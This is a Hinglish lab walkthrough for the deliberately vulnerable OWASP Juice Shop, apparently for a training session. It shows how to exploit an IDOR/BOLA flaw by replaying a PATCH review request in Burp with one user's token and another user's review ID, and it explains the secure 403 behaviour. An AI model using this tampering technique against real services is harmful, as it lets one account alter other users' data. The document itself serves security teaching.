Step 0 — Create Two Test Users (User A & User B)
Juice Shop home page open karo → /#/register (ya "Not yet a customer?" pe click karo).
User A create karo:
text
   Email: usera@test.com
   Password: TestPass@123
   Security Question: koi bhi answer
Registration submit karo → account create ho jayega.
Wapas registration page pe jao aur User B create karo:
text
   Email: userb@test.com
   Password: TestPass@123
   Security Question: koi bhi answer
Ab dono accounts ready hain — inhe hum turn-by-turn login karke use karenge.

💡 Tip: Session me dikhane ke liye do alag browsers (ya ek normal + ek incognito) use kar sakte ho taaki dono accounts parallel open rakh sako without repeated logout/login.
## Step 1 — Login as User A & Create a Review

1. Juice Shop me **User A** se login karo.
2. Koi bhi product open karo.
3. Ek review/comment daalo:
   ```text
   Hello from User A
   ```
4. Burp Suite proxy on karke request intercept/capture karo.

---

## Step 2 — Note Down the Review's `_id`

Response me review object ka unique `_id` dikhega:

```json
{
  "_id": "REVIEW-ID",
  "author": "usera@test.com",
  "message": "Hello from User A"
}
```

> ⚠️ **Yaad rakho:** `author` field ko manually edit nahi karna — yeh sirf application-generated ID hai jo verify karega ki server access-control check kar raha hai ya nahi.

---

## Step 3 — Login as User B & Note Their Review ID

1. Logout karo User A se.
2. **User B** se login karo.
3. Ek review daalo (ya existing review use karo) aur uska `_id` note karo:

```text
User B Review ID: xbBSXjGpHQPFiDqHH
```

---

## Step 4 — Switch Back to User A & Tamper the Request

1. Logout User B, login **User A** wapas.
2. Review PATCH request Burp **Repeater** me bhejo.
3. Request body me apna review ID hata ke **User B ki review ID** daal do — token User A ka hi rehne do.

```http
PATCH /rest/products/reviews HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <USER-A-TOKEN>
Content-Type: application/json

{
    "id": "USER-B-REVIEW-ID",
    "message": "Modified by User A"
}
```

---

## Step 5 — Send & Analyze Response

Agar server request accept kar leta hai aur User B ka review change ho jaata hai:

```json
{
  "modified": 1,
  "updated": [
    {
      "author": "userb@test.com",
      "message": "Modified by User A"
    }
  ]
}
```

### ✅ Evidence Checklist (Session me dikhane ke liye)

| Kya check karna hai | Expected (Vulnerable) |
|---|---|
| Request kis token se authenticated hai | User A |
| Target object kiska hai | User B |
| Object ID kisne supply ki | User A (B ki ID daal ke) |
| Server ne accept kiya? | Haan |
| Kiska data modify hua | User B ka |

---

## 🧠 Why This Is IDOR / BOLA

```text
User A authenticated
        ↓
User B ki review ID supply ki
        ↓
Ownership/authorization check missing
        ↓
User B ka review modify ho gaya
        ↓
= IDOR / BOLA
```

## ✅ Expected Secure Behavior

```text
User A authenticated
        ↓
User B ki review ID supply ki
        ↓
Server check kare: kya yeh review User A ki hai?
        ↓
NO
        ↓
403 Forbidden — Request denied
```

---
